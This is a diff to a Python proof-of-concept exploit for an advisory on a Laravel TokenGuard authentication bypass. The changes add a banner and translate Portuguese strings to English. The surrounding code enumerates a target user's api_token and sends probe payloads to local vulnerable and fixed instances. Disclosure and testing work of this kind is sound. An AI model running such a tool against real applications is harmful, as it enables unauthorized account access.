@@ -7,15 +7,25 @@ import sys
 import time
 import urllib.parse
 
+BANNER = """
+_____________________________________________________________________________________
+______  ___  _________ ___ ____  _____
+___  / / /_/   |___/ //_/_/   |__/   _/ / Laravel TokenGuard Auth Bypass            /
+__  /_/ /__ /| |__  , <__  /| |  _/ /  /                                           /
+_  __  /_  ___ |_  /| |_  ___ |__/ /  /     Laravel <= 13.26.x                     /
+/_/ /_/ /_/  |_|/_/ |_|/_/  |_|/___/ /       https://hakaisecurity.io              /
+________________________________________________________________________________"""
+
 logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s")
 log = logging.getLogger("poc")
 
+print(BANNER)
 parser = argparse.ArgumentParser(description="GHSA-f9x3-7vq9-cph6 PoC")
 parser.add_argument("vuln_url", nargs="?", default="http://127.0.0.1:8891")
 parser.add_argument("fixed_url", nargs="?", default="http://127.0.0.1:8892")
-parser.add_argument("--proxy", help="proxy de inspecao (Burp/mitmproxy), ex.: 127.0.0.1:8080")
-parser.add_argument("--target", type=int, help="id do usuario alvo; enumera api_token [0..9]")
-parser.add_argument("--targetUser", help="email do usuario alvo; enumera api_token [0..9]")
+parser.add_argument("--proxy", help="inspection proxy (Burp/mitmproxy), e.g. 127.0.0.1:8080")
+parser.add_argument("--target", type=int, help="target user id; enumerates api_token [0..9]")
+parser.add_argument("--targetUser", help="target user email; enumerates api_token [0..9]")
 args = parser.parse_args()
 
 vuln_url = args.vuln_url
@@ -68,7 +78,7 @@ def probe_target():
                  n, status, who, uid, " <- target" if hit else "")
         if hit:
             return
-    log.info("alvo nao encontrado em [0..9]")
+    log.info("target not found in [0..9]")
 
 
 probes = [
@@ -84,5 +94,5 @@ try:
         for app, base_url, payload in probes:
             exploit_line(app, base_url, payload)
 except OSError as error:
-    log.error("%s (proxy: %s)", error, args.proxy or "direto")
+    log.error("%s (proxy: %s)", error, args.proxy or "direct")
     sys.exit(1)
